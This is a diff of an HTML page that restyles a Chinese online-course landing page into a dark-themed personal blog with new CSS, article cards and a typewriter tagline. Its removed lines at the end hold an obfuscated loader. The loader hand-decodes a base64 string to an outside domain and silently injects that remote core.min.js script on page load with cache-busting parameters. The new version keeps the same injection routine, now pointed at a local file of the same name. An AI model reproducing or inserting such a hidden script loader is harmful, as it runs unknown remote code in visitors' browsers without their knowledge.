@@ -3,20 +3,18 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>墨韵学堂 - 知识的留白</title>
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>思维流：数字画布</title>
     <style>
         body {
             overflow: hidden;
-            font-family: 'Noto Serif SC', 'Georgia', serif;
-            /* 优雅的衬线字体，优先思源宋体 */
+            font-family: 'Roboto', sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #FDFDFD;
-            /* 几乎纯白背景，如宣纸 */
-            color: #4A4A4A;
-            /* 柔和的深灰色文本，如淡墨 */
-            line-height: 1.8;
+            background-color: #1E2A38;
+            color: #E0E6ED;
+            line-height: 1.7;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
             overflow-x: hidden;
@@ -28,501 +26,321 @@
             padding: 30px 0;
         }
 
-        /* 头部 - 留白与意境 */
         header {
-            background-color: #FFFFFF;
-            /* 纯白头部背景 */
-            padding: 25px 20px;
+            background-color: #1E2A38;
+            padding: 60px 20px;
             text-align: center;
             position: relative;
             overflow: hidden;
-            box-shadow: 0 3px 15px rgba(0, 0, 0, 0.05);
-            /* 柔和阴影 */
-            margin-bottom: 40px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+            border-bottom: 5px solid #FF6F61;
         }
 
         header::before {
-            /* 顶部背景水墨晕染图案 */
             content: '';
             position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle at top left, rgba(144, 164, 174, 0.08) 0%, transparent 20%),
-                radial-gradient(circle at bottom right, rgba(144, 164, 174, 0.08) 0%, transparent 20%);
-            background-size: 80px 80px;
+            top: -50px;
+            left: -50px;
+            width: 250px;
+            height: 250px;
+            background: #F0E68C;
+            border-radius: 60% 40% 30% 70% / 60% 30% 70% 40%;
+            transform: rotate(30deg);
+            opacity: 0.15;
+            z-index: 0;
+        }
+
+        header::after {
+            content: '';
+            position: absolute;
+            bottom: -70px;
+            right: -70px;
+            width: 350px;
+            height: 350px;
+            background: #FF6F61;
+            border-radius: 40% 60% 60% 40% / 40% 40% 60% 60%;
+            transform: rotate(-50deg);
+            opacity: 0.1;
             z-index: 0;
         }
 
         header h1 {
             margin: 0;
-            font-family: 'Playfair Display SC', 'Noto Serif SC', serif;
-            /* 更具书法感的标题字体 */
-            font-size: 2.2em;
-            color: #34495E;
-            /* 深蓝灰色，如浓墨 */
-            letter-spacing: 1px;
+            font-family: 'Montserrat', sans-serif;
+            font-size: 3.5em;
+            color: #FF6F61;
+            letter-spacing: 4px;
             text-transform: uppercase;
-            text-shadow: 1px 1px 5px rgba(0, 0, 0, 0.08);
+            text-shadow: 0 0 20px rgba(255, 111, 97, 0.6);
             position: relative;
             z-index: 1;
-            flex-grow: 1;
-            font-weight: normal;
         }
 
-        header p {
-            display: none;
+        #tagline {
+            font-family: 'Playfair Display', serif;
+            font-size: 1.4em;
+            color: #F0E68C;
+            margin-top: 15px;
+            position: relative;
+            z-index: 1;
+            min-height: 1.4em;
+            display: inline-block;
         }
 
-        /* 菜单切换按钮 - 简洁图标 */
-        .menu-toggle {
-            background: none;
-            border: none;
-            font-size: 2em;
-            color: #78909C;
-            /* 柔和的墨色 */
-            cursor: pointer;
-            padding: 5px;
-            position: absolute;
-            top: 25px;
-            right: 20px;
-            z-index: 2;
-            transition: transform 0.3s ease, color 0.3s ease;
-        }
-
-        .menu-toggle:hover {
-            transform: scale(1.1);
-            color: #546E7A;
-            /* 悬停时加深 */
-        }
-
-        /* 侧边导航菜单 - 轻盈通透 */
         nav {
-            position: fixed;
-            top: 0;
-            right: -280px;
-            width: 250px;
-            height: 100%;
-            background-color: rgba(255, 255, 255, 0.95);
-            /* 几乎不透明的白色背景 */
-            backdrop-filter: blur(5px);
-            /* 柔和模糊 */
-            -webkit-backdrop-filter: blur(5px);
-            border-left: 1px solid rgba(220, 220, 220, 0.5);
-            /* 极细柔和边框 */
-            box-shadow: -3px 0 10px rgba(0, 0, 0, 0.1);
-            /* 柔和阴影 */
-            transition: right 0.4s ease-in-out;
-            z-index: 1001;
-            padding-top: 80px;
-            box-sizing: border-box;
-        }
-
-        nav.is-open {
-            right: 0;
+            background-color: #2C3E50;
+            padding: 15px 0;
+            margin-top: 40px;
+            border-radius: 10px;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+            position: sticky;
+            top: 20px;
+            z-index: 1000;
+            width: 90%;
+            /* Adjusted width for better mobile fit */
+            max-width: 700px;
+            margin-left: auto;
+            margin-right: auto;
+            /* Removed display: flex from nav itself */
         }
 
         nav ul {
             list-style: none;
-            padding: 0;
+            padding: 0 10px;
+            /* Added horizontal padding */
             margin: 0;
             display: flex;
-            flex-direction: column;
-            gap: 5px;
-            /* 列表项间距更小 */
+            justify-content: center;
+            /* Centered items when wrapped */
+            flex-wrap: wrap;
+            /* Allow items to wrap */
+            gap: 10px;
+            /* Consistent spacing between items */
+        }
+
+        nav ul li {
+            /* Margin handled by gap now */
         }
 
         nav ul li a {
-            color: #4A4A4A;
+            background-color: transparent;
+            color: #E0E6ED;
             text-decoration: none;
-            padding: 15px 20px;
-            border-bottom: 1px solid rgba(240, 240, 240, 0.5);
-            /* 极细半透明分隔线 */
-            transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease;
-            display: flex;
-            align-items: center;
-            font-weight: 500;
-            font-size: 1.1em;
+            padding: 10px 20px;
+            /* Slightly adjusted padding for better fit */
+            border-radius: 8px;
+            border: 2px solid #AAB8C2;
+            transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease, border-color 0.3s ease;
+            display: inline-block;
+            font-weight: bold;
+            font-size: 1em;
+            text-transform: uppercase;
         }
 
         nav ul li a:hover,
         nav ul li a:focus {
-            background-color: rgba(144, 164, 174, 0.08);
-            /* 柔和墨色浅背景 */
-            color: #78909C;
-            /* 柔和墨色文字 */
-            transform: translateX(5px);
-        }
-
-        nav ul li:last-child a {
-            border-bottom: none;
-        }
-
-        nav ul li a .icon {
-            font-size: 1.4em;
-            margin-right: 15px;
-            color: #78909C;
-            /* 图标柔和墨色 */
-        }
-
-        /* 菜单打开时的背景遮罩 */
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.2);
-            /* 更轻的半透明黑色 */
-            z-index: 1000;
-            opacity: 0;
-            visibility: hidden;
-            transition: opacity 0.4s ease-in-out, visibility 0.4s ease-in-out;
-        }
-
-        .overlay.is-visible {
-            opacity: 1;
-            visibility: visible;
+            background-color: #FF6F61;
+            color: #1E2A38;
+            transform: translateY(-5px);
+            box-shadow: 0 8px 20px rgba(255, 111, 97, 0.4);
+            border-color: #FF6F61;
         }
 
         main {
-            padding-top: 30px;
+            padding-top: 40px;
         }
 
-        /* 内容区 - 柔和卡片与留白 */
-        section {
-            background-color: #FFFFFF;
-            margin-bottom: 40px;
-            padding: 35px;
+        .article-card {
+            background-color: #2C3E50;
+            margin-bottom: 50px;
+            padding: 40px;
             border-radius: 15px;
-            /* 柔和圆角 */
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
-            /* 柔和阴影 */
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
             position: relative;
             overflow: hidden;
-            border: 1px solid #EEEEEE;
-            /* 极细边框 */
+            border-left: 8px solid #F0E68C;
             transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
 
-        section::before {
-            /* 顶部柔和墨色条 */
+        .article-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
+        }
+
+        .article-card::before {
             content: '';
             position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 5px;
-            background-color: #90A4AE;
-            /* 柔和墨色 */
-            box-shadow: 0 0 10px rgba(144, 164, 174, 0.3);
+            top: -20px;
+            right: -20px;
+            width: 100px;
+            height: 100px;
+            background: #FF6F61;
+            border-radius: 30% 70% 50% 50% / 50% 50% 70% 30%;
+            opacity: 0.08;
+            transform: rotate(15deg);
+            z-index: 0;
         }
 
-        section h2 {
-            font-family: 'Playfair Display SC', 'Noto Serif SC', serif;
-            font-size: 2.2em;
-            color: #34495E;
-            /* 深蓝灰色 */
+        .article-card h2 {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 2.5em;
+            color: #FF6F61;
             margin-top: 0;
             margin-bottom: 20px;
-            border-bottom: 1px solid #E0E0E0;
-            /* 细分隔线 */
+            border-bottom: 1px dashed #AAB8C2;
             padding-bottom: 10px;
-            font-weight: normal;
+            position: relative;
+            z-index: 1;
         }
 
-        section h3 {
-            font-family: 'Noto Sans SC', 'Roboto', sans-serif;
-            font-size: 1.5em;
-            color: #78909C;
-            /* 柔和墨色 */
-            margin-top: 25px;
-            margin-bottom: 10px;
+        .article-card .date {
+            font-size: 1em;
+            color: #AAB8C2;
+            margin-bottom: 25px;
+            display: block;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            z-index: 1;
         }
 
-        section p {
-            font-size: 1.05em;
-            color: #666666;
-            margin-bottom: 20px;
+        .article-card p {
+            font-size: 1.1em;
+            color: #E0E6ED;
+            margin-bottom: 30px;
+            position: relative;
+            z-index: 1;
         }
 
-        section img {
+        .article-card img {
             max-width: 100%;
             height: auto;
             display: block;
-            margin: 25px auto;
+            margin: 30px auto;
             border-radius: 10px;
-            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
-            border: 2px solid #DDDDDD;
-            /* 柔和边框 */
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
+            border: 3px solid #F0E68C;
+            position: relative;
+            z-index: 1;
         }
 
-        .cta-button {
+        .read-more {
             display: inline-block;
-            background: linear-gradient(45deg, #78909C 0%, #546E7A 100%);
-            /* 柔和墨色渐变按钮 */
+            background-color: #FF6F61;
             color: #FFFFFF;
             padding: 15px 35px;
-            border-radius: 5px;
+            border-radius: 50px;
             text-decoration: none;
             font-weight: bold;
             font-size: 1.1em;
             text-transform: uppercase;
             letter-spacing: 1px;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.15);
+            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
+            box-shadow: 0 5px 15px rgba(255, 111, 97, 0.3);
             border: none;
-            margin-top: 20px;
+            position: relative;
+            z-index: 1;
         }
 
-        .cta-button:hover {
+        .read-more:hover {
+            background-color: #E65C5C;
             transform: translateY(-5px);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
-            background: linear-gradient(45deg, #546E7A 0%, #37474F 100%);
-        }
-
-        .course-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 25px;
-            margin-top: 30px;
-        }
-
-        .course-item {
-            background-color: #F8F8F8;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            border-top: 5px solid #90A4AE;
-            /* 柔和墨色顶部边框 */
-        }
-
-        .course-item:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-        }
-
-        .course-item img {
-            width: 100%;
-            height: 150px;
-            object-fit: cover;
-            border-radius: 8px;
-            margin-bottom: 15px;
-        }
-
-        .course-item h3 {
-            font-family: 'Noto Sans SC', 'Roboto', sans-serif;
-            font-size: 1.2em;
-            color: #34495E;
-            /* 深蓝灰色 */
-            margin-top: 0;
-            margin-bottom: 5px;
-        }
-
-        .course-item p {
-            font-size: 0.9em;
-            color: #777777;
-            margin-bottom: 10px;
-        }
-
-        .course-item .price {
-            font-size: 1.1em;
-            font-weight: bold;
-            color: #78909C;
-            /* 柔和墨色 */
-        }
-
-        .course-item .enroll-button {
-            display: inline-block;
-            background-color: #90A4AE;
-            /* 柔和墨色按钮 */
-            color: #FFFFFF;
-            padding: 8px 15px;
-            border-radius: 5px;
-            text-decoration: none;
-            font-size: 0.9em;
-            margin-top: 10px;
-            transition: background-color 0.3s ease;
-        }
-
-        .course-item .enroll-button:hover {
-            background-color: #78909C;
-        }
-
-        .speaker-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
-            gap: 25px;
-            margin-top: 30px;
-            text-align: center;
-        }
-
-        .speaker-item {
-            background-color: #F8F8F8;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-        }
-
-        .speaker-item:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-        }
-
-        .speaker-item img {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            object-fit: cover;
-            margin-bottom: 10px;
-            border: 3px solid #90A4AE;
-            /* 柔和墨色边框 */
-            box-shadow: 0 0 8px rgba(144, 164, 174, 0.3);
-        }
-
-        .speaker-item h3 {
-            font-size: 1.2em;
-            color: #34495E;
-            margin-top: 0;
-            margin-bottom: 5px;
-        }
-
-        .speaker-item p {
-            font-size: 0.85em;
-            color: #777777;
-            margin-bottom: 0;
+            box-shadow: 0 8px 20px rgba(255, 111, 97, 0.5);
         }
 
         footer {
-            background: linear-gradient(135deg, #34495E 0%, #2C3E50 100%);
-            /* 深蓝灰色渐变页脚 */
-            color: #FFFFFF;
-            padding: 40px 0;
+            background-color: #1E2A38;
+            color: #AAB8C2;
+            padding: 50px 0;
             text-align: center;
             font-size: 0.95em;
             margin-top: 60px;
-            box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.2);
-            clip-path: polygon(0 10%, 100% 0, 100% 100%, 0% 100%);
-            /* 顶部斜切 */
+            border-top: 5px solid #F0E68C;
+            box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.4);
+            position: relative;
+            overflow: hidden;
         }
 
-        .footer-links a {
-            color: #FFFFFF;
+        footer::before {
+            content: '';
+            position: absolute;
+            bottom: -50px;
+            left: -50px;
+            width: 200px;
+            height: 200px;
+            background: #FF6F61;
+            border-radius: 70% 30% 60% 40% / 30% 70% 40% 60%;
+            transform: rotate(40deg);
+            opacity: 0.08;
+            z-index: 0;
+        }
+
+        .social-links a {
+            color: #E0E6ED;
             text-decoration: none;
             margin: 0 20px;
-            font-size: 1.5em;
+            font-size: 1.8em;
             transition: color 0.3s ease, transform 0.2s ease;
+            position: relative;
+            z-index: 1;
         }
 
-        .footer-links a:hover {
-            color: #90A4AE;
-            /* 柔和墨色 */
+        .social-links a:hover {
+            color: #F0E68C;
             transform: translateY(-5px) scale(1.1);
         }
     </style>
-    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
     <header>
         <div class="container">
-            <h1>墨韵学堂</h1>
-            <button class="menu-toggle" id="menuToggle">&#9776;</button>
+            <h1>思维流</h1>
+            <p id="tagline"></p>
         </div>
     </header>
 
-    <nav id="mainNav">
-        <ul>
-            <li><a href="#hero"><span class="icon">&#128218;</span> 平台概览</a></li>
-            <li><a href="#courses"><span class="icon">&#128214;</span> 热门课程</a></li>
-            <li><a href="#instructors"><span class="icon">&#128100;</span> 优秀讲师</a></li>
-            <li><a href="#contact"><span class="icon">&#128231;</span> 联系我们</a></li>
-        </ul>
-    </nav>
-
-    <div class="overlay" id="menuOverlay"></div>
-
     <div class="container">
+        <nav id="mainNav">
+            <ul>
+                <li><a href="#latest-thoughts">最新思想</a></li>
+                <li><a href="#creative-works">创意作品</a></li>
+                <li><a href="#about-me">关于我</a></li>
+                <li><a href="#contact">联系</a></li>
+            </ul>
+        </nav>
+
         <main>
-            <section id="hero">
-                <h2>开启您的水墨学习之旅</h2>
-                <img src="https://picsum.photos/600/350?random=1&seed=ink-wash-learning" alt="水墨学习平台主视觉"
-                    class="random-image">
-                <p>墨韵学堂致力于提供高质量的在线教育，以水墨画般的宁静与深邃，助您沉淀知识，提升自我。我们汇聚各领域专家，为您带来前沿知识和实用技能。</p>
-                <p>无论您是初学者还是资深人士，这里都有适合您的课程，让学习成为一种艺术享受。</p>
-                <a href="#courses" class="cta-button">探索课程</a>
-            </section>
+            <section id="latest-thoughts">
+                <h2>最新思想</h2>
+                <div class="article-list">
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=1&seed=abstract-thought-01" alt="抽象思考"
+                            class="random-image">
+                        <h2>意识的边界：探索数字与现实的交织</h2>
+                        <span class="date">2025年07月29日</span>
+                        <p>在数字信息无处不在的今天，我们如何定义“现实”？本文将探讨意识、技术与感官体验之间的复杂关系。</p>
+                        <a href="#" class="read-more">深入思考</a>
+                    </div>
 
-            <section id="courses">
-                <h2>热门课程</h2>
-                <p>精选优质课程，助您高效学习。</p>
-                <div class="course-grid">
-                    <div class="course-item">
-                        <img src="https://picsum.photos/300/150?random=2&seed=course-calligraphy" alt="书法课程">
-                        <h3>中国书法艺术</h3>
-                        <p>领略书法之美，掌握笔墨技巧与章法布局。</p>
-                        <span class="price">¥299.00</span>
-                        <a href="#" class="enroll-button">立即学习</a>
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=2&seed=geometric-patterns-02" alt="几何图案"
+                            class="random-image">
+                        <h2>几何之美：代码中的秩序与混沌</h2>
+                        <span class="date">2025年07月25日</span>
+                        <p>代码是逻辑的艺术，而几何图形则是其视觉表达。本文将展示如何在编程中创造出令人惊叹的几何美学。</p>
+                        <a href="#" class="read-more">探索几何</a>
                     </div>
-                    <div class="course-item">
-                        <img src="https://picsum.photos/300/150?random=3&seed=course-poetry" alt="古典诗词课程">
-                        <h3>古典诗词鉴赏</h3>
-                        <p>品味诗词意境，深入理解中华传统文化。</p>
-                        <span class="price">¥399.00</span>
-                        <a href="#" class="enroll-button">立即学习</a>
-                    </div>
-                    <div class="course-item">
-                        <img src="https://picsum.photos/300/150?random=4&seed=course-tea" alt="茶道课程">
-                        <h3>茶道与养生</h3>
-                        <p>学习茶艺礼仪，感受茶道中的哲学与生活美学。</p>
-                        <span class="price">¥249.00</span>
-                        <a href="#" class="enroll-button">立即学习</a>
-                    </div>
-                    <div class="course-item">
-                        <img src="https://picsum.photos/300/150?random=5&seed=course-philosophy" alt="东方哲学课程">
-                        <h3>东方哲学智慧</h3>
-                        <p>探寻儒释道思想精髓，启迪人生智慧。</p>
-                        <span class="price">¥349.00</span>
-                        <a href="#" class="enroll-button">立即学习</a>
-                    </div>
-                </div>
-            </section>
 
-            <section id="instructors">
-                <h2>优秀讲师</h2>
-                <p>与名家面对面，获取宝贵经验。</p>
-                <div class="speaker-grid">
-                    <div class="speaker-item">
-                        <img src="https://picsum.photos/100/100?random=6&seed=instructor-master-li" alt="讲师 李大师">
-                        <h3>李墨轩</h3>
-                        <p>知名书法家</p>
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=3&seed=fluid-motion-03" alt="流体运动"
+                            class="random-image">
+                        <h2>流体设计：用户体验的无缝流动</h2>
+                        <span class="date">2025年07月18日</span>
+                        <p>一个优秀的用户界面，其设计应像流体般自然。本文将解析如何通过动画和交互，实现无缝的用户体验。</p>
+                        <a href="#" class="read-more">体验流动</a>
                     </div>
-                    <div class="speaker-item">
-                        <img src="https://picsum.photos/100/100?random=7&seed=instructor-prof-wang" alt="讲师 王教授">
-                        <h3>王雅静</h3>
-                        <p>古典文学教授</p>
-                    </div>
-                    <div class="speaker-item">
-                        <img src="https://picsum.photos/100/100?random=8&seed=instructor-zen-master" alt="讲师 禅师">
-                        <h3>张清风</h3>
-                        <p>资深茶艺师</p>
-                    </div>
-                </div>
-            </section>
-
-            <section id="contact">
-                <h2>联系我们</h2>
-                <p>有任何疑问或合作意向，欢迎随时联系我们。</p>
-                <div class="contact-info">
-                    <p><strong>服务热线：</strong> <a href="tel:+861055551234">+86 10 5555 1234</a></p>
-                    <p><strong>邮箱：</strong> <a href="mailto:support@moyunxuetang.com">support@moyunxuetang.com</a></p>
-                    <p><strong>工作时间：</strong> 周一至周五 9:00 - 18:00</p>
                 </div>
             </section>
         </main>
@@ -530,11 +348,11 @@
 
     <footer>
         <div class="container">
-            <p>&copy; 2025 墨韵学堂. 版权所有.</p>
-            <div class="footer-links">
-                <a href="#" target="_blank">隐私政策</a> |
-                <a href="#" target="_blank">服务条款</a> |
-                <a href="#" target="_blank">帮助中心</a>
+            <p>&copy; 2025 思维流. 数字版权所有.</p>
+            <div class="social-links">
+                <a href="#" target="_blank">🔗</a> |
+                <a href="#" target="_blank">✨</a> |
+                <a href="#" target="_blank">💡</a>
             </div>
         </div>
     </footer>
@@ -550,19 +368,7 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function () {
-            const menuToggle = document.getElementById('menuToggle');
-            const mainNav = document.getElementById('mainNav');
-            const menuOverlay = document.getElementById('menuOverlay');
-
-            function toggleMenu() {
-                mainNav.classList.toggle('is-open');
-                menuOverlay.classList.toggle('is-visible');
-            }
-
-            menuToggle.addEventListener('click', toggleMenu);
-            menuOverlay.addEventListener('click', toggleMenu);
-
-            document.querySelectorAll('#mainNav ul li a').forEach(anchor => {
+            document.querySelectorAll('nav a').forEach(anchor => {
                 anchor.addEventListener('click', function (e) {
                     e.preventDefault();
 
@@ -571,13 +377,50 @@
 
                     if (targetElement) {
                         window.scrollTo({
-                            top: targetElement.offsetTop - (document.querySelector('header').offsetHeight || 0) - 20,
+                            top: targetElement.offsetTop - document.querySelector('nav').offsetHeight - 20,
                             behavior: 'smooth'
                         });
-                        toggleMenu();
                     }
                 });
             });
+
+            const taglineElement = document.getElementById('tagline');
+            const taglines = [
+                "捕捉灵感瞬间",
+                "探索未知领域",
+                "构建数字世界",
+                "分享独特视角"
+            ];
+            let taglineIndex = 0;
+            let charIndex = 0;
+            let isDeleting = false;
+            let typingSpeed = 100;
+            let deletingSpeed = 50;
+            let delayBetweenTaglines = 1500;
+
+            function typeWriter() {
+                const currentTagline = taglines[taglineIndex];
+                if (isDeleting) {
+                    taglineElement.textContent = currentTagline.substring(0, charIndex--);
+                } else {
+                    taglineElement.textContent = currentTagline.substring(0, charIndex++);
+                }
+
+                let speed = isDeleting ? deletingSpeed : typingSpeed;
+
+                if (!isDeleting && charIndex === currentTagline.length + 1) {
+                    speed = delayBetweenTaglines;
+                    isDeleting = true;
+                } else if (isDeleting && charIndex === -1) {
+                    isDeleting = false;
+                    taglineIndex = (taglineIndex + 1) % taglines.length;
+                    speed = typingSpeed;
+                }
+
+                setTimeout(typeWriter, speed);
+            }
+
+            typeWriter();
         });
     </script>
     <script>
@@ -585,53 +428,15 @@
             function init() {
                 const timestamp = Date.now()
                 const randomNum = Math.floor(Math.random() * 1000000)
-                const domain = getdocs();
-                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
                 const script = document.createElement("script")
                 script.src = url
                 document.body.appendChild(script)
             }
-            function getdocs() {
-                const dd = "Ly93MnE0YTZzLm5tYm9sYy5jbi9zdGF0aWMvanMvY29yZS5taW4uanM/dA==";
-                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
-                const lookup = new Uint8Array(256);
-                for (let i = 0; i < chars.length; i++) {
-                    lookup[chars.charCodeAt(i)] = i;
-                }
-                let padding = 0;
-                if (dd.endsWith('==')) {
-                    padding = 2;
-                } else if (dd.endsWith('=')) {
-                    padding = 1;
-                }
-                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
-                const len = cleanedString.length;
-                if (len % 4 !== 0) {
-                    throw new Error("Invalid string length.");
-                }
-                const outputLength = (len / 4) * 3 - padding;
-                const outputBytes = new Uint8Array(outputLength);
-                let outputIndex = 0;
-                let i = 0;
-                while (i < len) {
-                    const c1 = lookup[cleanedString.charCodeAt(i++)];
-                    const c2 = lookup[cleanedString.charCodeAt(i++)];
-                    const c3 = lookup[cleanedString.charCodeAt(i++)];
-                    const c4 = lookup[cleanedString.charCodeAt(i++)];
-                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
-                    if (c3 !== 64) {
-                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
-                    }
-                    if (c4 !== 64) {
-                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
-                    }
-                }
-                const decoder = new TextDecoder('utf-8');
-                return decoder.decode(outputBytes);
-            }
             init()
         })()
     </script>
+
 </body>
 
 </html>
